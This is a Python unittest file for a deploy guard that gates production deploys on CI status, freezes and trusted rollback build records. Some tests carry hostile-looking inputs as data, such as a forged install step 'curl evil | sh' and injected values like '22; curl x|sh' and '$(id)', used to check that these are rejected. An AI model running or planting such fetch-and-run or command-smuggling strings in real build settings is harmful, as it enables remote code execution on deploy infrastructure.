# scripts/test_deploy_guard.py
import contextlib
import io
import json
import subprocess
import types
import unittest
from unittest import mock

import deploy_guard
from deploy_guard import decide, deployment_request, freezes_to_close, pick_live, pick_previous, recorded_build

A, B, C = "a" * 40, "b" * 40, "c" * 40
BUILD_A = {"kind": "pages", "node": "20", "install": "npm ci", "build": "npm run build", "out_dir": "dist", "cf_project": "site"}
BUILD_B = {**BUILD_A, "node": "22", "out_dir": "build"}


def ctx(**kw):
    c = {"sha": B, "reason": "deploy", "env": "production", "on_main": True, "ci": "success",
         "live_sha": A, "newer_than_live": True, "ledger_success_shas": [A], "freezes": [],
         "pr": 12, "pr_labels": [], "now": "2026-10-01T00:00:00Z", "has_drill_alias": True,
         "current_build": BUILD_B, "live_build": BUILD_A, "target_build": BUILD_A}
    c.update(kw)
    return c


class Decide(unittest.TestCase):
    def test_happy_deploy_goes_with_live_as_rollback_target(self):
        d = decide(ctx())
        self.assertTrue(d["go"])
        self.assertEqual((d["prev_sha"], d["from_sha"]), (A, A))

    def test_deploy_requires_green_ci(self):
        for state in ("failure", "missing", "in_progress"):
            with self.subTest(state=state):
                d = decide(ctx(ci=state))
                self.assertFalse(d["go"])
                self.assertIn(f"ci is {state}", d["message"])

    def test_unmerged_sha_refused(self):
        self.assertFalse(decide(ctx(on_main=False))["go"])
        self.assertFalse(decide(ctx(on_main=False, reason="rollback"))["go"])

    def test_already_live_is_skipped_for_deploy(self):
        self.assertIn("already live", decide(ctx(sha=A))["message"])

    def test_out_of_order_older_sha_is_skipped(self):
        d = decide(ctx(newer_than_live=False))
        self.assertFalse(d["go"])
        self.assertIn("out of order", d["message"])

    def test_freeze_blocks_deploy_unless_hotfix(self):
        self.assertIn("#42", decide(ctx(freezes=[42]))["message"])
        self.assertFalse(decide(ctx(freezes=[42]))["go"])
        self.assertTrue(decide(ctx(freezes=[42], pr_labels=["hotfix"]))["go"])

    def test_first_deploy_has_no_rollback_target(self):
        d = decide(ctx(live_sha="", ledger_success_shas=[]))
        self.assertTrue(d["go"])
        self.assertEqual(d["prev_sha"], "")
        self.assertIn("first v4 deploy", d["message"])

    def test_rollback_to_pre_ci_commit_allowed_when_on_ledger(self):
        self.assertTrue(decide(ctx(reason="rollback", sha=C, ci="missing", ledger_success_shas=[A, C]))["go"])

    def test_rollback_refused_without_ci_or_ledger(self):
        self.assertFalse(decide(ctx(reason="rollback", sha=C, ci="missing"))["go"])

    def test_rollback_to_live_is_a_noop_redeploy(self):
        d = decide(ctx(reason="rollback", sha=A))
        self.assertTrue(d["go"])
        self.assertIn("no-op", d["message"])

    def test_rollback_ignores_freeze_and_age(self):
        self.assertTrue(decide(ctx(reason="rollback", freezes=[42], newer_than_live=False))["go"])

    def test_force_smoke_fail_refused_on_production(self):
        self.assertFalse(decide(ctx(force_smoke_fail=True))["go"])
        self.assertTrue(decide(ctx(force_smoke_fail=True, env="drill"))["go"])

    def test_drill_needs_a_preview_alias(self):
        self.assertFalse(decide(ctx(env="drill", has_drill_alias=False))["go"])


class Ledger(unittest.TestCase):
    def dep(self, sha, state, payload=None):
        return {"sha": sha, "state": state, "created_at": "", "payload": payload or {}}

    def test_pick_live_ignores_failures(self):
        self.assertEqual(pick_live([self.dep(B, "failure"), self.dep(A, "success")]), A)

    def test_pick_previous_skips_live_and_rolled_back_shas(self):
        deps = [self.dep(A, "success", {"rolled_back_from": B}), self.dep(B, "success"), self.dep(C, "success")]
        self.assertEqual((pick_live(deps), pick_previous(deps)), (A, C))

    def test_deployment_request_never_auto_merges_or_waits_on_contexts(self):
        r = deployment_request(A, "production-worker", "deploy", "https://run")
        self.assertIs(r["auto_merge"], False)
        self.assertEqual(r["required_contexts"], [])
        self.assertTrue(r["production_environment"])
        self.assertTrue(deployment_request(A, "drill", "deploy", "")["transient_environment"])

    def test_freezes_to_close_ignores_freezes_newer_than_the_decision(self):
        fz = [{"number": 1, "created_at": "2026-10-01T00:00:00Z"}, {"number": 2, "created_at": "2026-10-01T00:05:00Z"}]
        self.assertEqual(freezes_to_close(fz, "2026-10-01T00:01:00Z"), [1])

    def test_freeze_opened_after_the_decision_survives(self):
        fz = [{"number": 1, "created_at": "2026-10-01T00:00:00Z"}, {"number": 2, "created_at": "2026-10-01T00:00:30Z"}]
        self.assertEqual(freezes_to_close(fz, "2026-10-01T00:00:10Z"), [1])

    def test_freeze_created_in_the_same_second_as_the_decision_survives(self):
        fz = [{"number": 1, "created_at": "2026-10-01T00:01:00Z"}]
        self.assertEqual(freezes_to_close(fz, "2026-10-01T00:01:00Z"), [])


class RecordedBuild(unittest.TestCase):
    """Rollback rebuilds the target with the params it deployed with, never the failed deploy's."""

    BOT = {"login": "github-actions[bot]", "type": "Bot"}

    def dep(self, sha, state, payload=None, creator=None):
        return {"sha": sha, "state": state, "created_at": "", "payload": payload or {}, "creator": self.BOT if creator is None else creator}

    def test_deployment_request_carries_the_build_params(self):
        r = deployment_request(A, "production", "deploy", "https://run", build=BUILD_A)
        self.assertEqual(r["payload"]["build"], BUILD_A)
        self.assertNotIn("build", deployment_request(A, "production", "deploy", "https://run")["payload"])

    def test_recorded_build_reads_the_newest_success_of_that_sha(self):
        deps = [self.dep(B, "success", {"build": BUILD_B}), self.dep(A, "failure", {"build": BUILD_B}),
                self.dep(A, "success", {"build": BUILD_A})]
        self.assertEqual(recorded_build(deps, A), BUILD_A)
        self.assertEqual(recorded_build(deps, B), BUILD_B)

    def test_no_record_or_incomplete_record_means_none(self):
        self.assertIsNone(recorded_build([self.dep(A, "success")], A))  # deployed before params were recorded
        self.assertIsNone(recorded_build([self.dep(A, "failure", {"build": BUILD_A})], A))
        self.assertIsNone(recorded_build([self.dep(A, "success", {"build": {"node": "20"}})], A))
        self.assertIsNone(recorded_build([self.dep(A, "success", {"build": "npm ci"})], A))
        self.assertIsNone(recorded_build([], A))

    def test_decide_hands_the_targets_params_to_the_rollback(self):
        d = decide(ctx(live_build=BUILD_A))
        self.assertEqual(json.loads(d["prev_build"]), BUILD_A)
        self.assertNotIn("\n", d["prev_build"])  # one line: it goes through $GITHUB_OUTPUT

    def test_decide_without_recorded_params_says_so(self):
        self.assertEqual(decide(ctx(live_build=None))["prev_build"], "")
        self.assertEqual(decide(ctx(ci="failure", live_build=BUILD_A))["prev_build"], "")

    def test_gather_looks_up_the_live_shas_params(self):
        fakes = {
            "gh": lambda *a, **k: "f" * 40, "now": lambda: "2026-10-01T00:00:00Z",
            "ledger": lambda *a: [self.dep(A, "success", {"build": BUILD_A})],
            "pr_of": lambda *a: (None, []), "ancestor_or_equal": lambda *a: True,
            "ci_state": lambda *a: "success", "open_freezes": lambda *a: [],
        }
        with contextlib.ExitStack() as st:
            for k, v in fakes.items():
                st.enter_context(mock.patch.object(deploy_guard, k, v))
            c = deploy_guard.gather("o/r", "f" * 40, "deploy", "production", False, True)
        self.assertEqual(c["live_sha"], A)
        self.assertEqual(c["live_build"], BUILD_A)

    def test_record_stores_the_params_in_the_deployment_payload(self):
        posted = []

        def fake_gh(*args, stdin=None):
            posted.append((args, stdin))
            return json.dumps({"id": 5})

        a = types.SimpleNamespace(repo="BJGLLC/r", sha=B, env="production", reason="deploy", url="https://x",
                                  run_url="https://run", state="success", from_sha=A, build_json=json.dumps(BUILD_B))
        with mock.patch.object(deploy_guard, "gh", fake_gh):
            deploy_guard.record(a)
        payload = json.loads(posted[0][1])["payload"]
        self.assertEqual(payload["build"], BUILD_B)
        self.assertEqual(payload["rolled_back_from"], A)

    def test_record_without_params_writes_none(self):
        posted = []
        a = types.SimpleNamespace(repo="BJGLLC/r", sha=B, env="production", reason="deploy", url="",
                                  run_url="", state="failure", from_sha="", build_json="")
        with mock.patch.object(deploy_guard, "gh", lambda *x, stdin=None: posted.append(stdin) or json.dumps({"id": 1})):
            deploy_guard.record(a)
        self.assertNotIn("build", json.loads(posted[0])["payload"])

    def test_record_cli_rejects_malformed_params(self):
        for bad in ("not json", "[]", json.dumps({"node": "20"})):
            with self.subTest(bad=bad), contextlib.redirect_stderr(io.StringIO()), \
                    mock.patch.object(deploy_guard, "gh", side_effect=AssertionError("validation must run before any gh call")), \
                    self.assertRaises(SystemExit):
                deploy_guard.main(["record", "--repo", "o/r", "--sha", B, "--env", "production", "--reason", "deploy",
                                   "--url", "", "--run-url", "", "--state", "success", "--build-json", bad])

    # --- fix round 1: trust, destination pinning, shape checks, the manual rollback path ---
    def test_records_by_anyone_but_the_gates_bot_are_not_trusted(self):
        forged = {"build": {**BUILD_A, "install": "curl evil | sh"}}
        for who in ({"login": "mallory", "type": "User"}, {"login": "github-actions[bot]", "type": "User"},
                    {"login": "cloudflare-pages[bot]", "type": "Bot"}, {}, None):
            with self.subTest(who=who):
                self.assertIsNone(recorded_build([self.dep(A, "success", forged, who or {})], A))
                d = decide(ctx(live_build=recorded_build([self.dep(A, "success", forged, who or {})], A)))
                self.assertEqual(d["prev_build"], "")

    def test_a_forged_newer_record_does_not_shadow_the_trusted_one(self):
        deps = [self.dep(A, "success", {"build": {**BUILD_A, "install": "evil"}}, {"login": "mallory", "type": "User"}),
                self.dep(A, "success", {"build": BUILD_A})]
        self.assertEqual(recorded_build(deps, A), BUILD_A)

    def test_ledger_reads_the_creator_and_tolerates_odd_payloads(self):
        def fake(path):
            if "/statuses" in path:
                return [{"state": "success"}]
            return [{"id": 1, "sha": A, "created_at": "t", "payload": "[1]", "creator": {"login": "github-actions[bot]", "type": "Bot"}},
                    {"id": 2, "sha": B, "created_at": "t", "payload": "not json", "creator": None},
                    {"id": 3, "sha": C, "created_at": "t", "payload": ["x"]},
                    {"id": 4, "sha": C, "created_at": "t", "payload": json.dumps({"build": BUILD_A}),
                     "creator": {"login": "github-actions[bot]", "type": "Bot"}}]
        with mock.patch.object(deploy_guard, "gh_json", fake):
            deps = deploy_guard.ledger("o/r", "production")
        self.assertEqual([d["payload"] for d in deps[:3]], [{}, {}, {}])
        self.assertEqual(deps[0]["creator"], self.BOT)
        self.assertEqual(recorded_build(deps, C), BUILD_A)
        self.assertEqual(decide(ctx(live_sha=A, live_build=recorded_build(deps, A)))["prev_build"], "")  # no crash

    def test_ledger_can_query_one_sha(self):
        seen = []
        with mock.patch.object(deploy_guard, "gh_json", lambda p: seen.append(p) or []):
            deploy_guard.ledger("o/r", "production", 20, A)
        self.assertIn(f"sha={A}", seen[0])

    def test_a_different_kind_or_project_disarms_the_rollback(self):
        for k, v in (("kind", "worker"), ("cf_project", "other-clients-project")):
            with self.subTest(k=k):
                d = decide(ctx(live_build={**BUILD_A, k: v}, current_build=BUILD_A))
                self.assertEqual((d["go"], d["prev_build"]), (True, ""))
                self.assertIn("different " + k, d["warning"])
                r = decide(ctx(reason="rollback", target_build={**BUILD_A, k: v}, current_build=BUILD_A))
                self.assertFalse(r["go"])
                self.assertEqual(r["ship_build"], "")

    def test_node_and_out_dir_shapes_are_checked(self):
        for k, v in (("node", "22; curl x|sh"), ("node", ""), ("node", "$(id)"), ("out_dir", "/etc"), ("out_dir", "../x"),
                     ("out_dir", "a/../../x"), ("out_dir", "a b"), ("out_dir", "$HOME"), ("kind", "lambda")):
            with self.subTest(k=k, v=v):
                self.assertNotEqual(deploy_guard.build_problem({**BUILD_A, k: v}, BUILD_A), "")
        for k, v in (("node", "22"), ("node", "20.11.1"), ("node", "20.x"), ("node", "lts/*"), ("node", "lts/iron"),
                     ("out_dir", ""), ("out_dir", "dist"), ("out_dir", "apps/web/.output/public"), ("out_dir", ".")):
            with self.subTest(ok=(k, v)):
                self.assertEqual(deploy_guard.build_problem({**BUILD_A, k: v}, BUILD_A), "")

    def test_auto_rollback_target_without_params_is_not_announced(self):
        d = decide(ctx(live_build=None))
        self.assertTrue(d["go"])
        self.assertEqual((d["prev_sha"], d["prev_build"]), (A, ""))
        self.assertNotIn("auto-rollback target", d["message"])
        self.assertIn("DISARMED", d["message"])
        self.assertIn("auto-rollback disarmed", d["warning"])
        self.assertIn("auto-rollback target", decide(ctx())["message"])

    def test_normal_deploys_ship_the_current_inputs(self):
        d = decide(ctx(current_build=BUILD_B, live_build=BUILD_A))
        self.assertEqual(json.loads(d["ship_build"]), BUILD_B)
        self.assertEqual(json.loads(d["prev_build"]), BUILD_A)

    def test_manual_rollback_ships_the_targets_recorded_params_not_current_inputs(self):
        d = decide(ctx(reason="rollback", sha=A, live_sha=B, current_build=BUILD_A, target_build=BUILD_A))
        self.assertTrue(d["go"])
        self.assertEqual(json.loads(d["ship_build"]), BUILD_A)
        # the failed change moved node/out_dir; the caller's current inputs differ but the target's win
        newer = {**BUILD_A, "node": "18", "out_dir": "public"}
        d = decide(ctx(reason="rollback", sha=A, live_sha=B, current_build=BUILD_B, target_build=newer))
        self.assertEqual(json.loads(d["ship_build"]), newer)

    def test_manual_rollback_without_a_record_refuses_loudly(self):
        d = decide(ctx(reason="rollback", target_build=None))
        self.assertFalse(d["go"])
        self.assertEqual(d["ship_build"], "")
        self.assertTrue(d["message"].startswith("refused: no recorded build params for bbbbbbb; manual rollback needed"))

    def test_gather_looks_up_the_rollback_targets_own_records(self):
        calls = []

        def fake_ledger(repo, env, n=20, sha=""):
            calls.append(sha)
            return [self.dep(A, "success", {"build": BUILD_A})] if sha in ("", A) else []
        fakes = {"gh": lambda *a, **k: A, "now": lambda: "t", "ledger": fake_ledger, "pr_of": lambda *a: (None, []),
                 "ancestor_or_equal": lambda *a: True, "ci_state": lambda *a: "success", "open_freezes": lambda *a: []}
        with contextlib.ExitStack() as st:
            for k, v in fakes.items():
                st.enter_context(mock.patch.object(deploy_guard, k, v))
            c = deploy_guard.gather("o/r", A, "rollback", "production", False, True, BUILD_B)
        self.assertEqual(c["target_build"], BUILD_A)
        self.assertEqual(c["current_build"], BUILD_B)
        self.assertIn(A, calls)

    def test_decide_cli_takes_the_current_build(self):
        out = io.StringIO()
        with mock.patch.object(deploy_guard, "gather", lambda *a: ctx()), contextlib.redirect_stdout(out):
            deploy_guard.main(["decide", "--repo", "o/r", "--sha", B, "--reason", "deploy", "--env", "production",
                               "--current-build", json.dumps(BUILD_B)])
        self.assertEqual(json.loads(json.loads(out.getvalue())["ship_build"]), BUILD_B)

    def test_freeze_text_is_truthful_when_nothing_was_rolled_back(self):
        made = []

        def fake_gh(*args, stdin=None):
            made.append(args)
            return "https://github.com/BJGLLC/r/issues/9"
        a = types.SimpleNamespace(repo="BJGLLC/r", env="production", frm=B, to=A, run_url="https://run", state="smoke-failed-no-target")
        with mock.patch.object(deploy_guard, "gh", fake_gh):
            deploy_guard.freeze_open(a)
        issue = next(c for c in made if c[:2] == ("issue", "create"))
        title, body = issue[issue.index("--title") + 1], issue[issue.index("--body") + 1]
        self.assertIn("[production]", title)
        self.assertNotIn("rolled back from", title)
        self.assertIn("NOT rolled back", body)
        self.assertIn("still live", body)


class FreezeOpen(unittest.TestCase):
    def test_creates_a_new_issue_even_when_a_freeze_is_already_open(self):
        calls = []

        def fake_gh(*args, stdin=None):
            calls.append(args)
            if args[0] == "api":
                return json.dumps([{"number": 7, "created_at": "2026-10-01T00:00:00Z", "title": "deploy-freeze [production]: x"}])
            if args[:2] == ("issue", "create"):
                return "https://github.com/BJGLLC/r/issues/8"
            return ""

        a = types.SimpleNamespace(repo="BJGLLC/r", env="production", frm=A, to=B, run_url="https://run")
        with mock.patch.object(deploy_guard, "gh", fake_gh):
            self.assertEqual(deploy_guard.freeze_open(a), 8)
        self.assertTrue(any(c[:2] == ("issue", "create") for c in calls))
        self.assertFalse(any(c[:2] == ("issue", "comment") for c in calls))


class Gather(unittest.TestCase):
    def test_decision_time_is_taken_before_the_freezes_are_read(self):
        order = []
        fakes = {
            "gh": lambda *a, **k: order.append("gh") or "f" * 40,
            "now": lambda: order.append("now") or "2026-10-01T00:00:00Z",
            "ledger": lambda *a: order.append("ledger") or [],
            "pr_of": lambda *a: order.append("pr_of") or (None, []),
            "ancestor_or_equal": lambda *a: order.append("ancestor") or True,
            "ci_state": lambda *a: order.append("ci") or "success",
            "open_freezes": lambda *a: order.append("open_freezes") or [],
        }
        with contextlib.ExitStack() as st:
            for k, v in fakes.items():
                st.enter_context(mock.patch.object(deploy_guard, k, v))
            deploy_guard.gather("o/r", "f" * 40, "deploy", "production", False, True)
        self.assertLess(order.index("now"), order.index("open_freezes"))

    def test_gh_failure_prints_stderr_and_reraises(self):
        err = subprocess.CalledProcessError(1, ["gh"], output="", stderr="HTTP 403: nope")
        with mock.patch.object(deploy_guard.subprocess, "run", side_effect=err), \
                contextlib.redirect_stderr(io.StringIO()) as se, self.assertRaises(subprocess.CalledProcessError):
            deploy_guard.gh("api", "x")
        self.assertIn("HTTP 403: nope", se.getvalue())


if __name__ == "__main__":
    unittest.main()
